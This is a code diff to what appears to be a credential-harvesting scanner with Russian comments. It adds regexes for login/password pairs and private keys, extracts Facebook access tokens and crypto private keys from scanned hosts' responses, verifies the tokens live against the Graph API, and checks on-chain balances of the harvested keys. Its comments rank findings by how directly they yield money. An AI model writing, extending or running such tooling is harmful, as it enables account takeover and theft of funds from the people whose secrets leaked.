@@ -26,6 +26,8 @@ from .ai_verify import (
     extract_twitter_sessions,
     extract_wp_creds,
     extract_integrations,
+    extract_crypto_keys,
+    extract_facebook_tokens,
     probe_wp_admin,
     probe_wp_sites,
     verify_ai_key,
@@ -33,6 +35,8 @@ from .ai_verify import (
     verify_cryptopay_key,
     verify_exchange_keypair,
     verify_integration,
+    verify_facebook,
+    check_key_balance,
     verify_secret,
     verify_telegram_bot,
     verify_twilio_pair,
@@ -153,7 +157,17 @@ OPENAPI_PATHS = [
 SENSITIVE_PATTERNS = {
     # CRITICAL - прямые деньги
     "password": re.compile(r'"(?:password|passwd|email_password|user_password)"\s*:\s*"([^"]{3,})"', re.I),
-    "private_key_pem": re.compile(r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----'),
+    # PEM с реальным телом: 40+ base64 сразу за заголовком. Плейсхолдер
+    # "-----BEGIN...\n...\n-----END" (LiteLLM /public/providers/fields) не матчится
+    "private_key_pem": re.compile(
+        r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----\s*[A-Za-z0-9+/]{40,}'),
+    # Чекер-листы: логин/email/телефон + пароль в одном объекте (оба порядка).
+    # Голый password - шум (wifi/IoT), пара = живые аккаунты
+    "account_pair": re.compile(
+        r'"(?:email|login|username|admin_email|user_email|account|phone|admin_username)"\s*:\s*"[^"]{3,80}"'
+        r'[^{}]{0,200}?"(?:password|admin_password|pwd|pass)"\s*:\s*"[^"]{4,}"'
+        r'|"password"\s*:\s*"[^"]{4,}"[^{}]{0,200}?"(?:email|login|username|admin_email|user_email|account|phone|admin_username)"\s*:\s*"[^"]{3,80}"',
+        re.I),
     # EVM/Tron private key: 64 hex (0x или без) в поле приватного ключа.
     # Широкий охват имён: private_key, PRIVATE_KEY, privateKey, evm_private_key,
     # walletPrivateKey, tron_private_key, owner_key, signer_key, deployer_key,
@@ -291,9 +305,13 @@ SENSITIVE_PATTERNS = {
 
     # Crypto wallets and keys
     "wallet_address": re.compile(r'"(?:wallet_address|wallet|address)"\s*:\s*"(?:0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|[1-9A-HJ-NP-Za-km-z]{32,44})"'),
-    # Любое приватное значение в приватном поле (base64/b58/строки) — широкий охват
+    # Любое приватное значение в приватном поле (base64/b58/строки) — широкий охват.
+    # Левая граница альтернации = anti-"m-eth-odology" (перед eth в method всегда m);
+    # (?<!pub)key = pubkey не приватный; UUID/маски-значения пропускаем
     "private_key_generic": re.compile(
-        r'"(?:[^"]{0,32}(?:priv|wallet|evm|eth|tron|signer|keeper)[^"]{0,24}key|privateKey)"\s*:\s*"[^"]{20,}"',
+        r'"(?:[^"]{0,32}(?<![a-z0-9])(?:priv|wallet|evm|eth|tron|signer|keeper)[^"]{0,24}(?<!pub)key|privateKey)"'
+        r'\s*:\s*"(?![0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})'
+        r'(?!\*{3,})[^"]{20,}"',
         re.I),
 }
 
@@ -555,15 +573,22 @@ SEVERITY_MAP = {
     "reset_token": "HIGH",
     "two_fa_backup": "CRITICAL",
     "admin_flag": "HIGH",
+    # Чекер-листы: логин+пароль = аккаунты
+    "account_pair": "HIGH",
+    # верифицированные аккаунты/деньги
+    "facebook_valid": "HIGH",
+    "private_key_money": "CRITICAL",
     # is_admin в ответе + фактический вход (путь /admin/* или токен рядом)
     "admin_area": "CRITICAL",
     "admin_access": "CRITICAL",
     "keystore_json": "CRITICAL",
     "smtp_password": "HIGH",
     "database_url": "HIGH",
-    "credential": "HIGH",
+    # TURN/iceScripts креды - времянки WebRTC, не секрет
+    "credential": "MEDIUM",
     "access_token": "HIGH",
-    "google_api_key": "HIGH",
+    # AIza почти всегда фронтендные Maps-ключи (бесплатные)
+    "google_api_key": "MEDIUM",
     "openai_key": "HIGH",
     "mailgun_key": "HIGH",
     "npm_token": "HIGH",
@@ -635,6 +660,16 @@ def classify_response(body: str) -> tuple[list[str], str]:
                         continue  # md5/sha1/sha256 хеш
                     if ENCODED_BLOB_RE.match(val):
                         continue  # закодированный блоб (base64), не пароль
+
+            # account_pair: пароль в паре должен быть реальным (hash/masked/placeholder - мимо)
+            if name == "account_pair":
+                pw = re.search(r'(?:password|admin_password|pwd|pass)"\s*:\s*"([^"]*)"', value_text, re.I)
+                if pw:
+                    val = pw.group(1)
+                    if is_masked_value(val) or is_placeholder_value("password", val):
+                        continue
+                    if HASHED_PASSWORD_RE.match(val) or ENCODED_BLOB_RE.match(val):
+                        continue
 
             # Токены: отсеиваем мусорные значения (fake_, даты, без цифр)
             if name in ("refresh_token", "auth_token", "bearer_token", "access_token", "session_id", "session_token"):
@@ -787,6 +822,10 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             cryptopay_keys_seen: set[tuple] = set()
             wp_pairs_found: list[dict[str, str]] = []
             wp_panel_seen: bool = False
+            facebook_tokens_found: list[str] = []
+            facebook_tokens_seen: set[str] = set()
+            crypto_keys_found: list[dict[str, str]] = []
+            crypto_keys_seen: set[tuple[str, str]] = set()
             integrations_found: list[dict[str, str]] = []
             integration_entries_seen: set[str] = set()
             integration_panel_seen: bool = False
@@ -939,6 +978,19 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                         wp_panel_seen = True
                                     wp_pairs_found.extend(
                                         extract_wp_creds(body[:100_000], fallback_url=base_url))
+                                if cfg.facebook_checks:
+                                    for tok in extract_facebook_tokens(body[:100_000]):
+                                        if tok not in facebook_tokens_seen \
+                                                and len(facebook_tokens_found) < cfg.facebook_verify_max:
+                                            facebook_tokens_seen.add(tok)
+                                            facebook_tokens_found.append(tok)
+                                if cfg.key_balance_checks:
+                                    for e in extract_crypto_keys(body[:100_000]):
+                                        sig = (e["kind"], e["value"])
+                                        if sig not in crypto_keys_seen \
+                                                and len(crypto_keys_found) < cfg.key_balance_max:
+                                            crypto_keys_seen.add(sig)
+                                            crypto_keys_found.append(e)
                                 if cfg.id_fuzz:
                                     # фаза 1: GET-шаблоны с {param} + значения
                                     # подстановок из тел (id/username/slug/email/...)
@@ -1124,6 +1176,19 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                                 wp_panel_seen = True
                                             wp_pairs_found.extend(
                                                 extract_wp_creds(fbody[:100_000], fallback_url=base_url))
+                                        if cfg.facebook_checks:
+                                            for tok in extract_facebook_tokens(fbody[:100_000]):
+                                                if tok not in facebook_tokens_seen \
+                                                        and len(facebook_tokens_found) < cfg.facebook_verify_max:
+                                                    facebook_tokens_seen.add(tok)
+                                                    facebook_tokens_found.append(tok)
+                                        if cfg.key_balance_checks:
+                                            for e in extract_crypto_keys(fbody[:100_000]):
+                                                sig = (e["kind"], e["value"])
+                                                if sig not in crypto_keys_seen \
+                                                        and len(crypto_keys_found) < cfg.key_balance_max:
+                                                    crypto_keys_seen.add(sig)
+                                                    crypto_keys_found.append(e)
                                         if cfg.ai_key_checks:
                                             for prov, k in extract_ai_keys(fbody[:100_000]):
                                                 ai_keys_found.setdefault(k, prov)
@@ -1200,6 +1265,19 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                         wp_panel_seen = True
                                     wp_pairs_found.extend(
                                         extract_wp_creds(rbody[:100_000], fallback_url=base_url))
+                                if cfg.facebook_checks:
+                                    for tok in extract_facebook_tokens(rbody[:100_000]):
+                                        if tok not in facebook_tokens_seen \
+                                                and len(facebook_tokens_found) < cfg.facebook_verify_max:
+                                            facebook_tokens_seen.add(tok)
+                                            facebook_tokens_found.append(tok)
+                                if cfg.key_balance_checks:
+                                    for e in extract_crypto_keys(rbody[:100_000]):
+                                        sig = (e["kind"], e["value"])
+                                        if sig not in crypto_keys_seen \
+                                                and len(crypto_keys_found) < cfg.key_balance_max:
+                                            crypto_keys_seen.add(sig)
+                                            crypto_keys_found.append(e)
                                 if cfg.integration_checks:
                                     for entry in extract_integrations(rbody[:100_000]):
                                         if entry["api_key"] not in integration_entries_seen:
@@ -1435,6 +1513,34 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 if wp_probe.get("login") or wp_probe.get("users_enum"):
                     wp_checks.append(wp_probe)
 
+            # Facebook EAA-токены: GET graph /me (read-only) = живые аккаунты
+            facebook_checks: list[dict[str, Any]] = []
+            if cfg.facebook_checks and facebook_tokens_found:
+                for tok in facebook_tokens_found[: cfg.facebook_verify_max]:
+                    chk = await verify_facebook(
+                        session, tok, proxy=proxy, timeout_s=8.0,
+                    )
+                    facebook_checks.append(chk)
+                    if chk["status"] == "valid":
+                        all_patterns.append("facebook_valid")
+                        if severity_order.get(max_severity, 0) < 2:
+                            max_severity = "HIGH"
+
+            # Приват-ключи: адрес → БЕСПЛАТНЫЙ on-chain баланс нативных монет.
+            # Ключ с балансом = почти голые деньги (ETH/BSC/SOL/BTC)
+            key_balance_checks: list[dict[str, Any]] = []
+            if cfg.key_balance_checks and crypto_keys_found:
+                for e in crypto_keys_found[: cfg.key_balance_max]:
+                    chk = await check_key_balance(
+                        session, e["kind"], e["value"],
+                        proxy=proxy, timeout_s=max(cfg.check_timeout, 12),
+                    )
+                    key_balance_checks.append(chk)
+                    if chk.get("total", 0) > 0:
+                        all_patterns.append("private_key_money")
+                        if severity_order.get(max_severity, 0) < 3:
+                            max_severity = "CRITICAL"
+
             # Интеграции панелей (service_type+api_key): Bearer-проба known-
             # сервисов (clickadu balance, clickadilla profile, cloudflare).
             integration_checks: list[dict[str, Any]] = []
@@ -1524,6 +1630,8 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 "exchange_checks": exchange_checks,
                 "cryptopay_checks": cryptopay_checks,
                 "wp_checks": wp_checks,
+                "facebook_checks": facebook_checks,
+                "key_balance_checks": key_balance_checks,
                 "integration_checks": integration_checks,
             }
 
